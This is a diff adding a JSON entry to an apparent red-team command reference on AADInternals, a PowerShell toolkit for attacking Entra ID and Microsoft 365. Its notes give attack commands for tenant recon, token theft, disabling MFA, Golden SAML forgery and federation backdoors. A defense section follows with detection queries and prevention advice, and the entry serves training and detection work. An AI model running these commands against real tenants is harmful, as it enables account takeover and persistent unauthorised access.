@@ -1,0 +1,118 @@
+{
+  "id": "cloud-aadinternals",
+  "name": "AADInternals - Azure AD / M365 Attack Toolkit",
+  "command": "Import-Module AADInternals; Get-AADIntAccessTokenForAADGraph -Credentials <creds>",
+  "description": "AADInternals is a PowerShell module for administering, enumerating, and attacking Azure AD (Entra ID) and Microsoft 365. It covers reconnaissance against tenants, access-token acquisition for many resources, credential and MFA inspection, Pass-the-PRT, Golden SAML / immutableID abuse, DesktopSSO/Seamless-SSO abuse, and backdoor federation. The single most comprehensive offensive Entra ID toolkit.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "Azure Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "Gerenios/AADInternals",
+  "tags": [
+    "aadinternals",
+    "azure",
+    "entra-id",
+    "m365",
+    "golden-saml",
+    "pass-the-prt",
+    "token"
+  ],
+  "mitre": [
+    "T1078.004",
+    "T1606.002",
+    "T1552"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== INSTALL ===\n  Install-Module AADInternals -Scope CurrentUser\n  Import-Module AADInternals\n\n=== UNAUTHENTICATED RECON (just a domain) ===\n  Get-AADIntLoginInformation -Domain <domain>        # is the tenant managed or federated\n  Invoke-AADIntReconAsOutsider -DomainName <domain>  # tenant id, domains, MDI/DesktopSSO status\n  Get-AADIntTenantID -Domain <domain>\n\n=== GET ACCESS TOKENS (many resources) ===\n  $cred = Get-Credential\n  Get-AADIntAccessTokenForAADGraph -Credentials $cred -SaveToCache\n  Get-AADIntAccessTokenForMSGraph -SaveToCache\n  Get-AADIntAccessTokenForEXO -SaveToCache          # Exchange Online\n  Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache\n  # also supports device-code, PRT, BPRT, and refresh-token flows\n\n=== AUTHENTICATED RECON ===\n  Invoke-AADIntReconAsInsider        # roles, users, devices, sync config\n  Get-AADIntGlobalAdmins\n  Get-AADIntSyncConfiguration        # AAD Connect / sync account details\n\n=== CREDENTIAL + MFA ABUSE ===\n  Get-AADIntUsersPasswordPolicy\n  Set-AADIntUserMFA -UserPrincipalName <user> -State Disabled   # if privileged\n\n=== GOLDEN SAML / IMMUTABLEID (needs token-signing cert) ===\n  # export ADFS token-signing cert with Export-AADIntADFSSigningCertificate on the ADFS box,\n  # then forge: New-AADIntSAMLToken / Open-AADIntOffice365Portal\n  ConvertTo-AADIntBackdoor -Domain <domain>          # federation backdoor (AnyPurpose)\n\n=== PASS-THE-PRT ===\n  # from a joined host: Get-AADIntUserPRTToken  then  Get-AADIntAccessTokenForAADGraph -PRTToken ...\n\n=== ALTERNATIVES ===\n  ROADtools/roadrecon   # offline Entra enumeration\n  AzureHound            # BloodHound graph\n  TokenTactics          # token manipulation only\n  GraphRunner           # post-compromise Graph toolkit",
+  "examples": [
+    {
+      "label": "Outsider recon of a tenant",
+      "command": "Invoke-AADIntReconAsOutsider -DomainName <domain>"
+    },
+    {
+      "label": "Get MSGraph token and cache",
+      "command": "Get-AADIntAccessTokenForMSGraph -Credentials $cred -SaveToCache"
+    },
+    {
+      "label": "Insider recon after auth",
+      "command": "Invoke-AADIntReconAsInsider"
+    }
+  ],
+  "references": [
+    {
+      "title": "AADInternals",
+      "url": "https://github.com/Gerenios/AADInternals"
+    },
+    {
+      "title": "AADInternals docs",
+      "url": "https://aadinternals.com/aadinternals/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cloud-roadrecon",
+      "note": "ROADrecon for offline Entra graph enumeration.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cloud-azurehound",
+      "note": "AzureHound for BloodHound attack-path graphing.",
+      "rel": "alternative"
+    },
+    {
+      "id": "azure-entra-enum",
+      "note": "Entra enumeration follows token acquisition.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "AADInternals uses documented Azure AD / M365 APIs and public token endpoints. Many recon calls are unauthenticated (tenant metadata is public), and token acquisition uses legitimate OAuth ROPC/device-code flows, so activity resembles normal client sign-ins unless federation/sync internals are touched.",
+    "prerequisites": "Unauthenticated: only a domain name. Authenticated actions: valid credentials or a token/PRT. Golden SAML: the ADFS token-signing certificate. Federation backdoor: Global Admin or sync-account rights.",
+    "impact": "Full tenant reconnaissance, token theft across resources, MFA tampering, persistent federation backdoors, and forged SAML tokens granting access as any user.",
+    "detection": "[MITRE T1078.004] Entra sign-in logs showing ROPC (password) or device-code grants from unusual clients/IPs; AADInternals default client IDs (e.g. 1b730954-... AAD Graph PowerShell); federation/domain changes (Set-DomainAuthentication) in the audit log; new or modified token-signing certs on ADFS.",
+    "artifacts": "Entra sign-in logs (clientAppUsed, appDisplayName), Entra audit logs for 'Set domain authentication' / 'Set federation settings', ADFS event 307/510 on cert changes, unusual MSGraph/EXO token issuance.",
+    "splunk_spl": "index=azure sourcetype=azure:aad:signin (authenticationProtocol=ropc OR authenticationProtocol=deviceCode)\n| stats count by userPrincipalName, appDisplayName, ipAddress\n| where count > 0",
+    "elastic_kql": "azure.signinlogs.properties.authentication_protocol:(ropc or deviceCode) or azure.auditlogs.operation_name:\"Set domain authentication\"",
+    "sentinel_kql": "SigninLogs\n| where AuthenticationProtocol in (\"ropc\",\"deviceCode\")\n| summarize Count=count() by UserPrincipalName, AppDisplayName, IPAddress\n| union (AuditLogs | where OperationName has \"domain authentication\" or OperationName has \"federation\")",
+    "sigma_rules": "azure_aadinternals_ropc_devicecode_signin",
+    "prevention": "Block ROPC and restrict device-code flow via Conditional Access; require MFA and compliant devices; protect ADFS token-signing certs (HSM, limited access); alert on any federation/domain-authentication change; move off ADFS to cloud auth where possible; monitor sync-account usage.",
+    "sources": [
+      "Gerenios/AADInternals",
+      "https://aadinternals.com/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Entra ROPC/device-code sign-in from AADInternals-style client",
+        "logic": "SigninLogs\n| where AuthenticationProtocol in (\"ropc\",\"deviceCode\") or AppId in (\"1b730954-1685-4b74-9bfd-dac224a7b894\",\"1950a258-227b-4e31-a9cf-717495945fc2\")\n| summarize Count=count(), IPs=make_set(IPAddress) by UserPrincipalName, AppDisplayName, bin(TimeGenerated, 1h)",
+        "data_source": "entra-id",
+        "attack": [
+          "T1078.004",
+          "T1552"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legacy scripts using ROPC; admin PowerShell tooling",
+        "tuning": "Allowlist known automation identities and source IPs; alert on new UPN+client pairs"
+      },
+      {
+        "platform": "sentinel",
+        "name": "Entra federation/domain authentication change (Golden SAML backdoor)",
+        "logic": "AuditLogs\n| where OperationName has \"domain authentication\" or OperationName has \"federation settings\"\n| project TimeGenerated, InitiatedBy, OperationName, TargetResources",
+        "data_source": "entra-id",
+        "attack": [
+          "T1606.002"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Planned federation migrations",
+        "tuning": "Alert on any change outside a change window; require ticket correlation"
+      }
+    ]
+  }
+}
